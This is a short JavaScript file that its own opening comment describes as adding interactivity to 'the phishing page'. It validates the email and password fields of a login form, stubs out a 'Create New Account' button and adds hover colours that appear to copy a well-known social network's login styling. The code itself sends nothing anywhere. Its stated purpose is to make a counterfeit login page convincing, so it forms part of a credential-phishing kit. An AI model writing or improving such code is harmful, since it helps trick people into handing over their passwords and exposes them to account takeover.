// Add interactivity to the phishing page

// Example: Add a click event to the "Create New Account" button
document.querySelector('.create-account').addEventListener('click', () => {
    alert('This feature is not available.');
});

// Example: Add form validation (optional)
document.querySelector('form').addEventListener('submit', (event) => {
    const email = document.querySelector('input[name="email"]').value;
    const password = document.querySelector('input[name="password"]').value;

    if (!email || !password) {
        alert('Please fill in all fields.');
        event.preventDefault(); // Prevent form submission
    }
});

// Example: Add a hover effect to the login button (optional)
document.querySelector('button[type="submit"]').addEventListener('mouseover', () => {
    document.querySelector('button[type="submit"]').style.backgroundColor = '#166fe5';
});

document.querySelector('button[type="submit"]').addEventListener('mouseout', () => {
    document.querySelector('button[type="submit"]').style.backgroundColor = '#1877f2';
});